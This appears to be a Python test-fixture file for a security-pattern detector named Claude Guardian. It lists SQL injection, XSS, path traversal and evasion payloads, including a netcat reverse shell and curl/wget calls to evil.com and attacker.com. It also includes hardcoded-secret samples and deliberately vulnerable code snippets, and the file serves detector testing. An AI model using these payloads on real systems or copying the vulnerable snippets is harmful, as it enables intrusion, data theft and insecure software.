#!/usr/bin/env python3
"""
Security Pattern Test Samples
Test cases for Claude Guardian security pattern detection
Contains both malicious patterns (for detection testing) and legitimate code (for false positive testing)
"""

# SQL INJECTION TEST CASES
sql_injection_samples = {
    "basic_union": "SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admin",
    "or_injection": "' OR 1=1 --",
    "drop_table": "'; DROP TABLE users; --",
    "exec_function": "EXEC('SELECT * FROM users')",
    "script_tag": "<script>alert('XSS')</script>",
    "nested_union": "1' UNION SELECT NULL, username||':'||password FROM users--",
    "blind_sqli": "1' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
    "time_based": "1'; WAITFOR DELAY '00:00:10'--"
}

# XSS TEST CASES
xss_samples = {
    "script_basic": "<script>alert('XSS')</script>",
    "javascript_protocol": "javascript:alert('XSS')",
    "event_handler": "<img src=x onerror=alert('XSS')>",
    "eval_function": "eval(userInput)",
    "document_cookie": "document.cookie",
    "iframe_src": "<iframe src=javascript:alert('XSS')></iframe>",
    "svg_xss": "<svg onload=alert('XSS')>",
    "style_expression": "<style>body{background:url('javascript:alert(1)')}</style>"
}

# PATH TRAVERSAL TEST CASES
path_traversal_samples = {
    "basic_traversal": "../../../etc/passwd",
    "windows_traversal": "..\\..\\..\\windows\\system32\\config\\sam",
    "url_encoded": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "double_encoded": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "null_byte": "../../../etc/passwd%00.jpg",
    "mixed_slashes": "..\\../..\\../etc/passwd"
}

# COMMAND INJECTION TEST CASES
command_injection_samples = {
    "semicolon_cat": "; cat /etc/passwd",
    "pipe_curl": "| curl http://evil.com",
    "backticks": "`whoami`",
    "dollar_paren": "$(ls -la)",
    "ampersand_wget": "&& wget http://evil.com/shell.sh",
    "pipe_netcat": "| nc -e /bin/sh attacker.com 4444",
    "command_substitution": "filename=`ls`"
}

# INSECURE SECRETS TEST CASES
insecure_secrets_samples = {
    "hardcoded_password": "password = 'admin123'",
    "api_key": "api_key = 'sk-1234567890abcdef'",
    "secret_token": "secret = 'abc123def456ghi789'",
    "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...",
    "db_password": "DB_PASSWORD = 'mySecretPass123'",
    "jwt_secret": "JWT_SECRET = 'super_secret_key_12345'"
}

# LEGITIMATE CODE SAMPLES (should NOT trigger false positives)
legitimate_code_samples = {
    "sql_comment": "# This function prevents SQL injection by using parameterized queries",
    "xss_prevention": "// Sanitize user input to prevent XSS attacks",
    "safe_file_path": "import os; safe_path = os.path.join('uploads', filename)",
    "secure_exec": "subprocess.run(['ls', '-la'], shell=False)",
    "config_reference": "password_field = 'password'  # Form field name",
    "documentation": "eval() function should never be used with user input",
    "safe_random": "import secrets; token = secrets.token_hex(32)",
    "path_validation": "if '..' in filename: raise ValueError('Invalid path')"
}

# EDGE CASE AND EVASION TEST CASES
evasion_samples = {
    "case_variation": "UnIoN sElEcT * FrOm UsErS",
    "whitespace_obfuscation": "UNION/**/SELECT/**/password/**/FROM/**/users",
    "comment_evasion": "OR/*comment*/1=1",
    "hex_encoding": "0x75726C656E636F6465642D706174682D747261766572736C",
    "unicode_evasion": "＜script＞alert('XSS')＜/script＞",
    "concatenation": "'UNI' + 'ON SELECT'",
    "variable_injection": "var cmd = 'ls'; exec(cmd + ' -la')"
}

# PERFORMANCE TEST SAMPLES
performance_test_samples = {
    "large_code_block": """
def process_user_data(data):
    # This is a large block of legitimate code to test performance
    results = []
    for item in data:
        if item.get('type') == 'user':
            user_id = item.get('id')
            username = item.get('username', '')
            email = item.get('email', '')
            
            # Validate input
            if not username or not email:
                continue
                
            # Process user data
            processed = {
                'id': user_id,
                'username': username.strip().lower(),
                'email': email.strip().lower(),
                'created_at': datetime.now().isoformat()
            }
            
            # Additional processing logic
            if '@' in email and '.' in email:
                domain = email.split('@')[1]
                processed['domain'] = domain
                
            results.append(processed)
    
    return results
    """ * 100,  # Repeat 100 times to create large block
    
    "mixed_content": """
    // Legitimate JavaScript code mixed with potential false positives
    function validateForm() {
        var password = document.getElementById('password').value;
        var confirm = document.getElementById('confirm').value;
        
        if (password !== confirm) {
            alert('Passwords do not match');
            return false;
        }
        
        // Check password strength
        if (password.length < 8) {
            alert('Password must be at least 8 characters');
            return false;
        }
        
        return true;
    }
    
    // API configuration
    const config = {
        apiUrl: 'https://api.example.com',
        timeout: 5000,
        retries: 3
    };
    
    // Database query example (safe)
    const query = 'SELECT id, username FROM users WHERE active = ?';
    db.execute(query, [true]);
    """
}

# REAL-WORLD VULNERABILITY SAMPLES
real_world_samples = {
    "php_sql_injection": """
    $query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
    $result = mysql_query($query);
    """,
    
    "node_command_injection": """
    const exec = require('child_process').exec;
    exec('ls ' + userInput, (error, stdout) => {
        console.log(stdout);
    });
    """,
    
    "python_path_traversal": """
    filename = request.args.get('file')
    with open('/uploads/' + filename, 'r') as f:
        return f.read()
    """,
    
    "javascript_xss": """
    function displayMessage(msg) {
        document.getElementById('output').innerHTML = msg;
    }
    displayMessage(userInput);
    """
}